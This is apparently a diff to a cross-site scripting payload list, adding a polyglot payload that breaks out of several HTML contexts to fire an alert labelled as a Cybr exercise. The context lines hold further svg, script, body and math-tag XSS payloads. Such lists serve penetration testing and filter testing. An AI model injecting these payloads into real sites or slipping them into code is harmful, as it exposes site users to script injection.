@@ -5,6 +5,8 @@
 "><svg onload=alert(1)>
 <script>alert(document.domain)</script>
 
+javascript:/*--></​ title​ ></​ style​ ></​ textarea​ ></​ script​ ></​ xmp​ ><​ svg​ / ​ onload​ = ​ '+/"/+/onmouseover=1/+/[*/[]/+alert("fun exercise from Cybr")//'​ >
+
 
 <body oninput=javascript:alert(1)><input autofocus>
 <math href="javascript:javascript:alert(1)">CLICKME</math> <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
